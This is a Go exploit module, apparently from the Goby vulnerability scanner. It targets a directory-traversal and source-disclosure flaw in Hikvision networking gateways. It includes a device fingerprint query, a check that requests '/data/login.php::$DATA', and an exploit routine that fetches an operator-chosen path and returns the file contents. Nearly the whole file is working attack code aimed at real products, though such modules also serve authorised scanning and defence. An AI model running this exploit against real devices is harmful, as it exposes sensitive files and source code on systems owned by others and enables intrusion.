package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Hikvision Networking gateway Directory traversal",
    "Description": "Hikvision networking gateway has a directory traversal vulnerability, use ::data to read sensitive information.",
    "Product": "Hikvision",
    "Homepage": "https://www.hikvision.com/cn/",
    "DisclosureDate": "2021-7-21",
    "Author": "1291904552@qq.com",
    "GobyQuery": "body=\"data/login.php\" && body=\"通用系统\"",
    "Level": "2",
    "Impact": "<p></p>",
    "Recommandation": "",
    "References": [
        "https://forum.butian.net/share/305"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filename",
            "type": "createSelect",
            "value": "/data,/data/login.php::$DATA"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "Disclosure of Sensitive Information"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": [
            "Hikvision"
        ]
    },
    "PocId": "10198",
    "Recommendation": ""
}`
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri_1 := "/data/login.php::$DATA"
			cfg_1 := httpclient.NewGetRequestConfig(uri_1)
			cfg_1.VerifyTls = false
			if resp_1, err := httpclient.DoHttpRequest(u, cfg_1); err == nil {
				if resp_1.StatusCode == 200 && strings.Contains(resp_1.Utf8Html, "系统登录设置") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filename := ss.Params["filename"].(string)
			uri := filename
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.Utf8Html
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
